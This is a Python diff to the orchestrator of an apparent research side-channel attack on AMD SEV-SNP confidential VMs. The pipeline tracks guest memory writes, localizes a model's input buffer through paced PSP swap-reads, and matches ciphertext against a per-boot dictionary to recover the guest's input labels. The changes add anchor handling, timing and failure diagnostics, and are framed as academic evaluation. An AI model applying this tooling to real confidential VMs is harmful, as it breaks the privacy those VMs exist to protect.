@@ -211,6 +211,46 @@ def _sig_terminate(signum, frame):
     raise SystemExit(128 + signum)
 
 
+def update_anchor(host_base: Optional[int], recency_list: List[int],
+                  known_blocks: Dict[int, int], loc_state: Dict[str, int],
+                  blind: bool) -> Optional[str]:
+    """Update the Stage 2 arena anchor (recency_list[0]) after one sample's
+    localization. Returns a reason clause when the anchor was dropped.
+
+    The anchor drives a 10x Stage 2 score boost within 8MB of it, so it must
+    only ever come from a CONFIRMED hit:
+     - seeding it with the block we just failed on (the original code) boosts
+       the wrong region and one miss poisons every later sample (measured:
+       median rank 52, localization 6.8%);
+     - seeding it once on cold start and keeping it (the next attempt) sticks
+       forever when the seed is wrong -- after the guest worker restarted at
+       sample 40 localization went 0/40.
+    So a miss never writes the anchor. After BLIND_ANCHOR_RESET_MISSES
+    consecutive misses it is treated as stale (the arena drifts ~1MB/sample and
+    jumps on a worker restart) and dropped. Blind Stage 3 now ranks blocks with
+    the anchor-free time-windowed run*hit (Phase KW); the anchor only affects
+    the Phase KB fallback.
+    """
+    note = None
+    if host_base:
+        blk = host_base & ~(c.BLOCK_SIZE - 1)
+        known_blocks[blk] = (host_base - blk) // c.PAGE_SIZE
+        if blk in recency_list:
+            recency_list.remove(blk)
+        recency_list.insert(0, blk)
+        loc_state["miss_streak"] = 0
+    else:
+        loc_state["miss_streak"] = loc_state.get("miss_streak", 0) + 1
+        if blind and recency_list and loc_state["miss_streak"] >= c.BLIND_ANCHOR_RESET_MISSES:
+            note = f"anchor dropped after {loc_state['miss_streak']} consecutive misses"
+            recency_list.clear()
+    # Bounded, and IN PLACE: rebinding the name (recency_list = recency_list[:3])
+    # leaves the caller's list untouched, so it used to grow without bound.
+    if len(recency_list) > 3:
+        del recency_list[3:]
+    return note
+
+
 def run_pipeline_for_sample(
     index: int,
     from_stage: int,
@@ -225,8 +265,11 @@ def run_pipeline_for_sample(
     dict_cache: Optional[Dict[str, Any]],
     output_dir: Path,
     blind: bool = False,
+    loc_state: Optional[Dict[str, int]] = None,
 ) -> Dict[str, Any]:
     """Execute stages [from_stage, to_stage] for a single sample index."""
+    if loc_state is None:
+        loc_state = {"miss_streak": 0}
     t_start = time.time()
     sample_res: Dict[str, Any] = {"index": index}
 
@@ -236,16 +279,26 @@ def run_pipeline_for_sample(
 
     gt: Dict[str, Any] = {"base": None, "N": None, "ind": None}
 
+    # Per-stage wall clock and a human-readable account of how this sample
+    # ended, both persisted per row so the batch can be analysed afterwards
+    # without re-reading the run log.
+    t_stage: Dict[str, Optional[float]] = {"t_stage2": None, "t_stage3": None,
+                                           "t_stage4": None, "t_stage5": None}
+    reasons: List[str] = []
+
     # -----------------------------------------------------------------------
     # Stage 1: Preparation (already done or run if requested)
     # -----------------------------------------------------------------------
     if from_stage <= 1 <= to_stage:
+        # Never rebuilds here: the dictionary is rebuilt once per batch in
+        # main() under --build-dict, because it is per-boot, not per-sample.
         run_stage1(build_dict=False, skip_existing=True, output_dir=output_dir)
 
     # -----------------------------------------------------------------------
     # Stage 2: Write Pattern Tracking
     # -----------------------------------------------------------------------
     st2_path = output_dir / f"stage2_tracked_{index}.json"
+    _t0_s2 = time.time()
     if from_stage <= 2 <= to_stage:
         if guest_loop is not None:
             # Online mode. Track writes ONLY during this sample's inference
@@ -266,7 +319,11 @@ def run_pipeline_for_sample(
 
             if gt.get("error"):
                 print(f"  [!] Guest error on index {index}: {gt['error']}")
-                return {"index": index, "verdict": "GEN_FAIL", "error": gt["error"]}
+                return {"index": index, "verdict": "GEN_FAIL", "error": gt["error"],
+                        "t_stage2": round(time.time() - _t0_s2, 1),
+                        "elapsed_sec": round(time.time() - t_start, 1),
+                        "reason": f"stage2: guest inference never reported a buffer "
+                                  f"({gt['error']}); no ground truth, nothing to localize"}
 
             active_anchor = recency_list[0] if recency_list else None
             st2_res = process_tracked_log(index, str(tracker_log_path), gt, top_k=c.N_TRACKER_CANDIDATES, out_dir=output_dir, start_offset=0, active_arena_anchor=active_anchor)
@@ -286,10 +343,29 @@ def run_pipeline_for_sample(
     else:
         st2_res = {}
 
+    if from_stage <= 2 <= to_stage:
+        t_stage["t_stage2"] = round(time.time() - _t0_s2, 1)
+
     cand_blks = [int(x, 16) for x in st2_res.get("candidate_blocks", [])]
     cand_run_bases = st2_res.get("candidate_run_bases", {})
     cand_runs = st2_res.get("candidate_runs", {})
     cand_page_ts = st2_res.get("candidate_page_ts", {})
+
+    # Where Stage 2's own ranking put the true block. This is the single most
+    # useful diagnostic for a localization miss: a blind scan can only reach
+    # the first few ranks within the swap budget, so rank >> budget explains
+    # the miss without any further investigation.
+    # Blind Stage 3 walks the time-windowed run*hit ranking (Phase KW), so that is
+    # the rank that explains a blind miss; the whole-window score rank does not.
+    use_window_rank = blind and "gt_window_rank" in st2_res
+    gt_block_rank = st2_res.get("gt_window_rank") if use_window_rank else st2_res.get("gt_rank")
+    rank_label = "window run*hit" if use_window_rank else "block score"
+    n_scored_blocks = st2_res.get("total_scored_blocks")
+    if gt_block_rank:
+        reasons.append(f"stage2: true block ranked #{gt_block_rank} by {rank_label}"
+                       f"{f' of {n_scored_blocks}' if n_scored_blocks else ''}")
+    elif st2_res:
+        reasons.append("stage2: true block absent from the candidate ranking")
 
     # -----------------------------------------------------------------------
     # Stage 3: Sharp Localization (Base GPA)
@@ -297,7 +373,9 @@ def run_pipeline_for_sample(
     host_base = None
     loc_strategy = "N/A"
     loc_swaps = 0
+    best_hits = None
     st3_path = output_dir / f"stage3_located_{index}.json"
+    _t0_s3 = time.time()
 
     if from_stage <= 3 <= to_stage:
         if fixed_gpa is not None and ip_ref is not None and ip_mask is not None:
@@ -309,6 +387,13 @@ def run_pipeline_for_sample(
             if gt.get("base"):
                 try:
                     gt_pg = gt["base"] & ~(c.PAGE_SIZE - 1)
+                    # Pace it like any other swap. This is real PSP traffic; if
+                    # it skips the pacer it runs outside the rate limiter and
+                    # outside MAX_TOTAL_SWAPS_RUN, which is exactly the swap
+                    # burst pattern that has wedged QEMU before. It stays out
+                    # of loc_swaps on purpose -- that column must report the
+                    # attack's cost, not the diagnostic's.
+                    pacer.tick()
                     _d = read_at_fixed(fixed_gpa, gt_pg, "gt_direct")
                     _h = sum(1 for j in ip_mask if c.get_chunk(_d, j) == c.get_chunk(ip_ref, j))
                     print(f"  [gt-direct] swap-read gt_base 0x{gt_pg:x}: image_pad hits="
@@ -330,6 +415,7 @@ def run_pipeline_for_sample(
                 candidate_page_ts=cand_page_ts,
                 bootstrap_block=bootstrap,
                 blind=blind,
+                window_candidates=st2_res.get("window_candidates"),
             )
             loc_match = c.loc_is_hit(host_base, gt.get("base")) if (host_base and gt.get("base")) else None
             # Exact-page delta alongside loc_match: loc_match allows +-
@@ -360,39 +446,71 @@ def run_pipeline_for_sample(
             host_base = int(st3_res["host_base"], 16) if st3_res.get("host_base") else None
             loc_strategy = st3_res.get("loc_strategy", "N/A")
             loc_swaps = st3_res.get("loc_swaps", 0)
+            best_hits = st3_res.get("best_hits")
     elif st3_path.exists():
         st3_res = c.load_json(st3_path)
         host_base = int(st3_res["host_base"], 16) if st3_res.get("host_base") else None
         loc_strategy = st3_res.get("loc_strategy", "N/A")
         loc_swaps = st3_res.get("loc_swaps", 0)
+        best_hits = st3_res.get("best_hits")
     else:
         st3_res = {}
 
-    if host_base:
-        blk = host_base & ~(c.BLOCK_SIZE - 1)
-        off = (host_base - blk) // c.PAGE_SIZE
-        known_blocks[blk] = off
-        if blk in recency_list:
-            recency_list.remove(blk)
-        recency_list.insert(0, blk)
-    elif cand_blks:
-        # On miss, retain recent anchors and update anchor with top candidate block
-        top_blk = cand_blks[0]
-        if top_blk not in recency_list:
-            recency_list.insert(0, top_blk)
-        recency_list = recency_list[:3]
+    if from_stage <= 3 <= to_stage:
+        t_stage["t_stage3"] = round(time.time() - _t0_s3, 1)
+        _min_match = max(c.IMAGE_PAD_MATCH_MIN,
+                         int(len(ip_mask) * 0.35)) if ip_mask else c.IMAGE_PAD_MATCH_MIN
+        if host_base:
+            _lm = c.loc_is_hit(host_base, gt.get("base")) if gt.get("base") else None
+            reasons.append(
+                f"stage3: confirmed page 0x{host_base:x} via {loc_strategy} after "
+                f"{loc_swaps} swap-read(s), image_pad {best_hits}/{len(ip_mask) if ip_mask else '?'} "
+                f">= {_min_match}" + ("" if _lm else
+                " BUT outside the +-{}p window around the true base (false confirm)".format(
+                    c.LOC_MATCH_PAGE_WINDOW)))
+        elif loc_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
+            # How deep the budget reaches: Phase KW probes up to
+            # BLIND_WINDOW_PAGES_PER_BLOCK pages per block.
+            _reach_blocks = (c.MAX_LOC_SWAPS_SAMPLE // max(c.BLIND_WINDOW_PAGES_PER_BLOCK, 1)
+                             if use_window_rank else 5)
+            reasons.append(
+                f"stage3: swap budget exhausted ({loc_swaps}/{c.MAX_LOC_SWAPS_SAMPLE}) "
+                f"with no page reaching the image_pad threshold; best was "
+                f"{best_hits}/{len(ip_mask) if ip_mask else '?'} < {_min_match}"
+                + (f" — true block was only rank #{gt_block_rank}, too deep to reach"
+                   if gt_block_rank and gt_block_rank > _reach_blocks else ""))
+        else:
+            reasons.append(
+                f"stage3: no page matched after {loc_swaps} swap-read(s) "
+                f"(budget not exhausted); best image_pad "
+                f"{best_hits}/{len(ip_mask) if ip_mask else '?'} < {_min_match}")
+
+    _anchor_note = update_anchor(host_base, recency_list, known_blocks, loc_state, blind)
+    if _anchor_note:
+        reasons.append(_anchor_note)
 
     # -----------------------------------------------------------------------
     # Stage 4: Pad Boundary & Indication Window Search
     # -----------------------------------------------------------------------
     st4_path = output_dir / f"stage4_bounds_{index}.json"
     n_pad_est = None
+    _t0_s4 = time.time()
     if from_stage <= 4 <= to_stage:
         if host_base:
             st4_res = run_stage4(index, base_gpa=host_base, output_dir=output_dir)
             n_pad_est = st4_res.get("N_est")
+            t_stage["t_stage4"] = round(time.time() - _t0_s4, 1)
+            if st4_res.get("status") == "SUCCESS":
+                reasons.append(f"stage4: pad_start={st4_res.get('pad_start')} "
+                               f"N_est={n_pad_est}, indication window "
+                               f"[{st4_res.get('tok_min')},{st4_res.get('tok_max')}]")
+            else:
+                reasons.append(f"stage4: {st4_res.get('status')} — pad bounds not "
+                               f"established, so Stage 5 has to fall back to its own "
+                               f"binary search and worst-case window")
         else:
             st4_res = {"status": "SKIPPED_LOC_FAIL"}
+            reasons.append("stage4: skipped, no located page")
     elif st4_path.exists():
         st4_res = c.load_json(st4_path)
         n_pad_est = st4_res.get("N_est")
@@ -406,16 +524,37 @@ def run_pipeline_for_sample(
     recovered_labels: List[str] = []
     eval_result: Dict[str, Any] = {}
 
+    _t0_s5 = time.time()
     if from_stage <= 5 <= to_stage:
         if host_base:
-            st5_res = run_stage5(index, stage4_json=st4_path, base_gpa=host_base, output_dir=output_dir)
+            st5_res = run_stage5(index, stage4_json=st4_path, base_gpa=host_base,
+                                 output_dir=output_dir, gt_indication=gt.get("ind"))
             recovered_labels = st5_res.get("recovered_labels", [])
             eval_result = st5_res.get("evaluation", {})
+            t_stage["t_stage5"] = round(time.time() - _t0_s5, 1)
+            _v = eval_result.get("verdict")
+            _fp = eval_result.get("false_positive_count", 0)
+            _mm = eval_result.get("multi_match_count", 0)
+            if eval_result.get("top1_exact_match"):
+                reasons.append(f"stage5: top-1 label matches the true indication "
+                               f"({_mm} match(es) total)")
+            elif eval_result.get("any_label_match"):
+                reasons.append(f"stage5: a correct label recovered but not ranked first "
+                               f"({_mm} matches, {_fp} false positive(s))")
+            elif _mm:
+                reasons.append(f"stage5: {_mm} label(s) matched but none belong to the "
+                               f"true indication — aliasing in the guessed indication "
+                               f"window (MIN_CLEAN_AES_BLOCKS=1 lets a single 16B block "
+                               f"match unrelated ciphertext)")
+            else:
+                reasons.append(f"stage5: no label matched anywhere in the indication "
+                               f"window (verdict={_v})")
         else:
             eval_result = c.evaluate_recovery([], gt.get("ind"))
             eval_result["verdict"] = "LOC_FAIL"
             st5_res = {"status": "LOC_FAIL", "evaluation": eval_result}
             c.save_json(st5_path, st5_res)
+            reasons.append("stage5: skipped, no located page")
     elif st5_path.exists():
         st5_res = c.load_json(st5_path)
         recovered_labels = st5_res.get("recovered_labels", [])
@@ -437,6 +576,8 @@ def run_pipeline_for_sample(
         "loc_strategy": loc_strategy,
         "loc_swaps": loc_swaps,
         "loc_match": c.loc_is_hit(host_base, gt.get("base")) if (host_base and gt.get("base")) else False,
+        "page_delta": (((host_base & ~(c.PAGE_SIZE - 1)) - (gt["base"] & ~(c.PAGE_SIZE - 1)))
+                       // c.PAGE_SIZE) if (host_base and gt.get("base")) else "",
         "blind": blind,
         "N_pad_est": n_pad_est or "",
         "verdict": eval_result.get("verdict", ("LOC_SUCCESS" if (host_base and gt.get("base") and c.loc_is_hit(host_base, gt.get("base"))) else ("LOC_MISMATCH" if host_base else "LOC_FAIL")) if to_stage < 5 else "NO_MATCH"),
@@ -446,8 +587,20 @@ def run_pipeline_for_sample(
         "multi_match_count": eval_result.get("multi_match_count", 0),
         "false_positive_count": eval_result.get("false_positive_count", 0),
         "false_positive_labels": " / ".join(eval_result.get("false_positive_labels", [])),
+        "t_stage2": t_stage["t_stage2"] if t_stage["t_stage2"] is not None else "",
+        "t_stage3": t_stage["t_stage3"] if t_stage["t_stage3"] is not None else "",
+        "t_stage4": t_stage["t_stage4"] if t_stage["t_stage4"] is not None else "",
+        "t_stage5": t_stage["t_stage5"] if t_stage["t_stage5"] is not None else "",
         "elapsed_sec": round(elapsed, 1),
+        "gt_block_rank": gt_block_rank if gt_block_rank else "",
+        "loc_best_hits": best_hits if best_hits is not None else "",
+        "reason": " | ".join(reasons),
     }
+
+    print(f"  [why] {sample_summary['reason']}")
+    print(f"  [time] stage2={t_stage['t_stage2']}s stage3={t_stage['t_stage3']}s "
+          f"stage4={t_stage['t_stage4']}s stage5={t_stage['t_stage5']}s "
+          f"total={round(elapsed, 1)}s")
 
     return sample_summary
 
@@ -474,6 +627,14 @@ def main():
     p.add_argument("--output-dir", type=Path, default=c.PIPELINE_DIR, help="Output directory")
     p.add_argument("--force-rerun", action="store_true", default=False, help="Force rerun even if sample already completed in summary CSV")
     p.add_argument("--blind", action="store_true", help="Withhold the ground-truth block from Stage 3 (measure true blind localization accuracy, no GT leakage)")
+    p.add_argument("--build-dict", action="store_true",
+                   help="Rebuild the ciphertext dictionary once, at the start of this "
+                        "batch, before the guest VLM loop comes up (~4 min). REQUIRED "
+                        "whenever Stage 5 runs: the SNP VEK is generated per VM launch, "
+                        "so a dictionary captured in an earlier boot cannot match this "
+                        "guest's ciphertext and Stage 5 silently returns only false "
+                        "positives. Not needed for a Stage 1-3 (localization) run, which "
+                        "uses the per-batch ICMP image_pad reference instead.")
     p.add_argument("--track-size", type=str, default=None, help="Write tracker window size (e.g. 0x800000000 for 32GB)")
     p.add_argument("--fast", action="store_true", help="Tighter localization pacing/budget for a quicker run (pushes PSP command rate higher — see common.SC_* knobs)")
     args = p.parse_args()
@@ -550,6 +711,7 @@ def main():
     pacer = c.Pacer()
     known_blocks: Dict[int, int] = {}
     recency_list: List[int] = []
+    loc_state: Dict[str, int] = {"miss_streak": 0}
 
     dict_cache = None
     if c.DICT_CACHE.exists():
@@ -587,6 +749,30 @@ def main():
             fixed_gpa = acquire_gpa(None)
             ip_ref, ip_mask = acquire_imagepad_reference(fixed_gpa)
             print(f"[orchestrator] Image-Pad reference ready: {len(ip_mask)}/256 confirmed offsets")
+
+            # ---------------------------------------------------------------
+            # Step A2: rebuild the ciphertext dictionary for THIS boot, ONCE
+            # per batch. The SNP VEK is generated by the PSP at each VM
+            # launch, so ciphertext for the same plaintext at the same
+            # physical address differs across boots: a dictionary captured in
+            # an earlier boot matches nothing and makes Stage 5 report pure
+            # false positives with no error. Built here, on the still-
+            # quiescent guest and before the VLM loop, for the same reason
+            # the calibration above is (ICMP plants need an idle guest).
+            # Per-sample Stage 1 never rebuilds -- that would cost ~4 min per
+            # sample instead of ~4 min per boot.
+            # ---------------------------------------------------------------
+            if args.build_dict:
+                print("[orchestrator] Rebuilding ciphertext dictionary for this boot "
+                      "(~4 min; VEK is per-launch so an older dictionary cannot match)...")
+                t_dict = time.time()
+                run_stage1(build_dict=True, skip_existing=False, output_dir=out_dir)
+                print(f"[orchestrator] Dictionary rebuilt in {time.time() - t_dict:.0f}s")
+            elif to_st >= 5:
+                print("[orchestrator] WARNING: Stage 5 will run against the EXISTING "
+                      f"dictionary ({c.DICT_CACHE}). If it was not built in THIS boot, "
+                      "every match is a false positive. Pass --build-dict.",
+                      file=sys.stderr)
 
             # ---------------------------------------------------------------
             # Step B: bring up the persistent guest VLM loop. The write tracker
@@ -631,7 +817,11 @@ def main():
                 guest_loop.close()
                 guest_loop.start()
                 known_blocks.clear()
-                recency_list.clear()
+                # In blind mode the anchor is NOT reset here: the attacker does
+                # not get told that the victim restarted, so using this harness
+                # event would be an oracle. The miss-streak reset handles it.
+                if not args.blind:
+                    recency_list.clear()
 
             # A single failed swap-read (PSP hiccup, guest wedge) must not kill a
             # 1,641-sample batch. Isolate it: the sample writes no
@@ -654,6 +844,7 @@ def main():
                     dict_cache=dict_cache,
                     output_dir=out_dir,
                     blind=args.blind,
+                    loc_state=loc_state,
                 )
                 consecutive_errors = 0
             except KeyboardInterrupt:
